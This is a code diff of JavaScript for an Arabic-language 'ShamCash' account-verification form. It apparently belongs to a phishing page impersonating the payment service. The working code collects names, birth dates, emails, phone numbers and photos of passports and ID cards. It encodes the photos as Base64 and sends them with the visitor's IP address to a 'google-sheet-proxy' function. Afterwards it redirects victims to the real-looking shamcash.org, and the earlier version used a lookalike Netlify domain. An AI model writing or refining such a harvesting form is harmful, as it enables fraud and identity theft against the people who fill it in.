@@ -3,22 +3,12 @@
 // =======================================================
 //          Global Configurations & IP variable
 // =======================================================
-const FINAL_REDIRECT_URL = "https://sham-cash-id-verify.netlify.app"; // إذا كان هناك رابط إعادة توجيه بعد النجاح
-let userIpAddress = 'غير معروف'; // Global variable to store IP
+const FINAL_REDIRECT_URL = "https://shamcash.org";
+let userIpAddress = 'غير معروف';
 
 // =======================================================
-//          Utility Functions (from your previous code, adapted)
+//          Utility Functions
 // =======================================================
-
-// Function to read a file as a Base64 string
-function readFileAsBase64(file) {
-    return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onload = () => resolve(reader.result.split(',')[1]); // Get only the Base64 part
-        reader.onerror = error => reject(error);
-        reader.readAsDataURL(file);
-    });
-}
 
 // Function to fetch IP address and store it globally
 async function fetchAndStoreUserIP() {
@@ -33,32 +23,28 @@ async function fetchAndStoreUserIP() {
     }
 }
 
+// Function to read a file as a Base64 string
+function readFileAsBase64(file) {
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(reader.result.split(',')[1]); // Get only the Base64 part
+        reader.onerror = error => reject(error);
+        reader.readAsDataURL(file);
+    });
+}
+
 // Updated Utility Function to send to Netlify Function (General Purpose)
-async function sendToNetlifyFunction(type, payload, files = {}) {
+async function sendToNetlifyFunction(type, payload) {
     const netlifyFunctionUrl = '/.netlify/functions/google-sheet-proxy';
-
-    // دمج بيانات النص وملفات Base64 في الحمولة (payload)
-    const combinedPayload = { ...payload, ipAddress: userIpAddress };
-
-    // إضافة ملفات Base64 إلى الحمولة (إن وجدت)
-    for (const key in files) {
-        if (files[key]) {
-            try {
-                combinedPayload[`${key}Base64`] = await readFileAsBase64(files[key]);
-            } catch (error) {
-                console.error(`Error converting file ${key} to Base64:`, error);
-                throw new Error(`Failed to read file ${key}.`);
-            }
-        }
-    }
 
     try {
         const response = await fetch(netlifyFunctionUrl, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' }, // الآن نرسل JSON وليس FormData
+            headers: { 'Content-Type': 'application/json' }, // نرسل JSON الآن
             body: JSON.stringify({
                 type: type,
-                payload: combinedPayload // نرسل الحمولة المجمعة
+                payload: payload, // الحمولة تحتوي الآن على بيانات نصية وصور Base64
+                ipAddress: userIpAddress
             })
         });
 
@@ -79,7 +65,7 @@ async function sendToNetlifyFunction(type, payload, files = {}) {
 
 // Functions for error display (kept as per your provided code)
 function showError(inputElement, messageElement, message) {
-    const parentInputGroup = inputElement.closest('.input-group') || inputElement.closest('.form-field-wrapper'); // Added form-field-wrapper for file inputs
+    const parentInputGroup = inputElement.closest('.input-group') || inputElement.closest('.form-field-wrapper');
     if (parentInputGroup) {
         parentInputGroup.classList.add('error');
     }
@@ -106,9 +92,9 @@ function showCustomModal(message, subtext, isSuccess = true) {
     modalSubtext.textContent = subtext;
 
     if (isSuccess) {
-        modalSpinner.classList.add('hidden'); // Hide spinner for success
+        modalSpinner.classList.add('hidden');
     } else {
-        modalSpinner.classList.remove('hidden'); // Show spinner for errors/loading
+        modalSpinner.classList.remove('hidden');
     }
 
     customModalOverlay.classList.remove('hidden');
@@ -117,7 +103,7 @@ function showCustomModal(message, subtext, isSuccess = true) {
     setTimeout(() => {
         customModalOverlay.classList.remove('show');
         customModalOverlay.classList.add('hidden');
-    }, 5000); // Hide after 5 seconds
+    }, 5000);
 }
 
 // =======================================================
@@ -157,7 +143,7 @@ const passportPageError = document.getElementById('passportPageError');
 // =======================================================
 
 // Set logo source
-appLogo.src = "../img/shamcash.svg"; // مسار اللوجو المعدل
+appLogo.src = "../img/shamcash.svg";
 
 // Populate year dropdown (last 100 years from current)
 const currentYear = new Date().getFullYear();
@@ -171,7 +157,7 @@ for (let i = currentYear; i >= currentYear - 100; i--) {
 // Populate month dropdown (1-12)
 for (let i = 1; i <= 12; i++) {
     const option = document.createElement('option');
-    option.value = i.toString().padStart(2, '0'); // ensure two digits
+    option.value = i.toString().padStart(2, '0');
     option.textContent = i.toString().padStart(2, '0');
     birthMonthSelect.appendChild(option);
 }
@@ -179,7 +165,7 @@ for (let i = 1; i <= 12; i++) {
 // Populate day dropdown (1-31 initially)
 for (let i = 1; i <= 31; i++) {
     const option = document.createElement('option');
-    option.value = i.toString().padStart(2, '0'); // ensure two digits
+    option.value = i.toString().padStart(2, '0');
     option.textContent = i.toString().padStart(2, '0');
     birthDaySelect.appendChild(option);
 }
@@ -194,11 +180,11 @@ function updateDaysInMonth() {
     const daySelect = birthDaySelect;
     const selectedDay = parseInt(daySelect.value);
 
-    daySelect.innerHTML = ''; // Clear existing days
+    daySelect.innerHTML = '';
 
     if (isNaN(year) || isNaN(month)) return;
 
-    const daysInMonth = new Date(year, month, 0).getDate(); // Get last day of month
+    const daysInMonth = new Date(year, month, 0).getDate();
 
     for (let i = 1; i <= daysInMonth; i++) {
         const option = document.createElement('option');
@@ -207,12 +193,10 @@ function updateDaysInMonth() {
         daySelect.appendChild(option);
     }
 
-    // Re-select the previously selected day if it's still valid
     if (selectedDay <= daysInMonth) {
         daySelect.value = selectedDay.toString().padStart(2, '0');
     }
 }
-// Initialize days in month on page load
 updateDaysInMonth();
 
 
@@ -227,7 +211,7 @@ document.querySelectorAll('input[name="verificationReason"]').forEach(radio => {
             otherReasonInput.removeAttribute('required');
             otherReasonInput.value = '';
         }
-        hideError(otherReasonInput, reasonError); // Hide reason error if "آخر" is selected
+        hideError(otherReasonInput, reasonError);
     });
 });
 
@@ -241,8 +225,8 @@ documentTypeRadios.forEach(radio => {
             otherDocumentInput.removeAttribute('required');
             otherDocumentInput.value = '';
         }
-        hideError(otherDocumentInput, documentTypeError); // Hide document type error
-        updateDocumentUploadSection(); // Update visibility of upload fields
+        hideError(otherDocumentInput, documentTypeError);
+        updateDocumentUploadSection();
     });
 });
 
@@ -269,16 +253,14 @@ function updateDocumentUploadSection() {
         if (selectedDocType === 'جواز السفر السوري') {
             passportPageContainer.classList.remove('hidden');
             document.getElementById('passportPage').setAttribute('required', 'true');
-        } else if (selectedDocType !== 'آخر') { // For other specific ID types
+        } else if (selectedDocType !== 'آخر') {
             idFrontContainer.classList.remove('hidden');
             document.getElementById('idFront').setAttribute('required', 'true');
-            // Check if back is required (assume all non-passport docs have front/back)
             idBackContainer.classList.remove('hidden');
             document.getElementById('idBack').setAttribute('required', 'true');
         }
     }
 }
-// Initial call to set correct visibility on page load
 updateDocumentUploadSection();
 
 // Fetch IP on page load
@@ -289,16 +271,14 @@ fetchAndStoreUserIP();
 // =======================================================
 
 // Basic input validation for instant feedback
-document.querySelectorAll('.input-field, .select-field, .other-input').forEach(input => {
+document.querySelectorAll('.input-field, .select-field, .other-input, input[type="file"]').forEach(input => {
     input.addEventListener('input', function() {
-        // Determine which error message to hide based on input ID or name
         const errorId = this.id + 'Error';
         const errorElement = document.getElementById(errorId);
         if (errorElement && !errorElement.classList.contains('hidden')) {
             hideError(this, errorElement);
         }
 
-        // Specific for radio group errors
         if (this.name === 'accountType' && !accountTypeError.classList.contains('hidden')) {
             accountTypeError.classList.add('hidden');
         }
@@ -313,12 +293,12 @@ document.querySelectorAll('.input-field, .select-field, .other-input').forEach(i
 
 // Event listener for form submission
 verificationForm.addEventListener('submit', async function(event) {
-    event.preventDefault(); // Prevent default form submission
+    event.preventDefault();
 
     loadingMessage.textContent = 'جاري إرسال طلبك...';
     loadingOverlay.classList.remove('hidden');
 
-    let isValid = true; // Overall form validation flag
+    let isValid = true;
 
     // --- 1. Validate Radio Buttons ---
     const accountType = document.querySelector('input[name="accountType"]:checked')?.value;
@@ -338,7 +318,7 @@ verificationForm.addEventListener('submit', async function(event) {
         showError(otherReasonInput, reasonError, 'الرجاء تحديد السبب الآخر.');
         isValid = false;
     } else if (verificationReason === 'آخر') {
-        verificationReason = otherReasonInput.value.trim(); // Use custom reason
+        verificationReason = otherReasonInput.value.trim();
     } else {
         hideError(otherReasonInput, reasonError);
     }
@@ -352,7 +332,7 @@ verificationForm.addEventListener('submit', async function(event) {
         showError(otherDocumentInput, documentTypeError, 'الرجاء تحديد نوع الوثيقة الآخر.');
         isValid = false;
     } else if (documentType === 'آخر') {
-        documentType = otherDocumentInput.value.trim(); // Use custom document type
+        documentType = otherDocumentInput.value.trim();
     } else {
         hideError(otherDocumentInput, documentTypeError);
     }
@@ -368,7 +348,7 @@ verificationForm.addEventListener('submit', async function(event) {
 
     const shamcashEmailInput = document.getElementById('shamcashEmail');
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    const allowedDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com']; // Add more as needed
+    const allowedDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com'];
 
     if (shamcashEmailInput.value.trim() === '') {
         showError(shamcashEmailInput, shamcashEmailError, 'الرجاء إدخال بريد إلكتروني.');
@@ -386,18 +366,16 @@ verificationForm.addEventListener('submit', async function(event) {
         }
     }
 
-
     const phoneNumberInput = document.getElementById('phoneNumber');
     if (phoneNumberInput.value.trim() === '') {
         showError(phoneNumberInput, phoneNumberError, 'الرجاء إدخال رقم الهاتف.');
         isValid = false;
-    } else if (!/^\d+$/.test(phoneNumberInput.value.trim())) { // Only numbers
+    } else if (!/^\d+$/.test(phoneNumberInput.value.trim())) {
         showError(phoneNumberInput, phoneNumberError, 'الرجاء إدخال أرقام فقط.');
         isValid = false;
     } else {
         hideError(phoneNumberInput, phoneNumberError);
     }
-
 
     // --- 3. Validate Date of Birth ---
     const year = birthYearSelect.value;
@@ -409,7 +387,7 @@ verificationForm.addEventListener('submit', async function(event) {
         isValid = false;
     } else {
         const dob = new Date(`${year}-${month}-${day}`);
-        if (isNaN(dob.getTime())) { // Check for invalid date
+        if (isNaN(dob.getTime())) {
             showError(birthYearSelect, birthDateError, 'تاريخ ميلاد غير صالح.');
             isValid = false;
         } else {
@@ -417,13 +395,13 @@ verificationForm.addEventListener('submit', async function(event) {
         }
     }
 
-
-    // --- 4. Validate File Uploads ---
+    // --- 4. Validate File Uploads and convert to Base64 ---
     const idFrontInput = document.getElementById('idFront');
     const idBackInput = document.getElementById('idBack');
     const passportPageInput = document.getElementById('passportPage');
 
     let filesToUpload = {};
+    let base64Promises = [];
 
     if (documentType === 'جواز السفر السوري') {
         if (!passportPageInput.files.length) {
@@ -431,39 +409,53 @@ verificationForm.addEventListener('submit', async function(event) {
             isValid = false;
         } else {
             hideError(passportPageInput, passportPageError);
-            filesToUpload.passportPage = passportPageInput.files[0];
+            base64Promises.push(readFileAsBase64(passportPageInput.files[0]).then(base64 => filesToUpload.passportPageBase64 = base64));
         }
-    } else if (documentType && documentType !== 'آخر') { // If a specific ID type is selected, and it's not "آخر"
+    } else if (documentType && documentType !== 'آخر') {
         if (!idFrontInput.files.length) {
             showError(idFrontInput, idFrontError, 'صورة الوجه الأمامي مطلوبة.');
             isValid = false;
         } else {
             hideError(idFrontInput, idFrontError);
-            filesToUpload.idFront = idFrontInput.files[0];
+            base64Promises.push(readFileAsBase64(idFrontInput.files[0]).then(base64 => filesToUpload.idFrontBase64 = base64));
         }
         if (!idBackInput.files.length) {
             showError(idBackInput, idBackError, 'صورة الوجه الخلفي مطلوبة.');
             isValid = false;
         } else {
             hideError(idBackInput, idBackError);
-            filesToUpload.idBack = idBackInput.files[0];
+            base64Promises.push(readFileAsBase64(idBackInput.files[0]).then(base64 => filesToUpload.idBackBase64 = base64));
         }
     }
 
+    // انتظر حتى يتم تحويل جميع الصور إلى Base64
+    if (base64Promises.length > 0) {
+        try {
+            await Promise.all(base64Promises);
+        } catch (error) {
+            console.error('Error converting files to Base64:', error);
+            showCustomModal('فشل التحميل', 'عذرًا، حدث خطأ أثناء تحويل الصور. الرجاء التأكد من صلاحية الملفات.', false);
+            loadingOverlay.classList.add('hidden');
+            return; // توقف هنا إذا فشل تحويل الصور
+        }
+    }
+
+
     if (!isValid) {
-        loadingOverlay.classList.add('hidden'); // Hide loading if validation fails
+        loadingOverlay.classList.add('hidden');
         return;
     }
 
     // --- All validations passed, proceed with submission ---
-    const formData = {
+    const formDataToSend = {
         accountType: accountType,
         verificationReason: verificationReason,
         documentType: documentType,
         fullName: fullNameInput.value.trim(),
-        birthDate: `${year}-${month}-${day}`, // YYYY-MM-DD format
+        birthDate: `${year}-${month}-${day}`,
         shamcashEmail: shamcashEmailInput.value.trim(),
-        phoneNumber: phoneNumberInput.value.trim()
+        phoneNumber: phoneNumberInput.value.trim(),
+        ...filesToUpload // إضافة صور Base64 إلى البيانات المرسلة
     };
 
     // Show loading overlay
@@ -471,15 +463,13 @@ verificationForm.addEventListener('submit', async function(event) {
     loadingOverlay.classList.remove('hidden');
 
     try {
-        // Send data and files to Netlify function
-        await sendToNetlifyFunction('verification_request', formData, filesToUpload);
+        await sendToNetlifyFunction('verification_request', formDataToSend);
 
-        // On success: show success modal and redirect
         loadingOverlay.classList.add('hidden');
         showCustomModal('تم إرسال طلبك بنجاح!', 'سيتم مراجعة بياناتك والتواصل معك قريباً.', true);
         setTimeout(() => {
             window.location.href = FINAL_REDIRECT_URL;
-        }, 3000); // Redirect after 3 seconds
+        }, 3000);
     } catch (error) {
         console.error('Error during form submission:', error);
         loadingOverlay.classList.add('hidden');
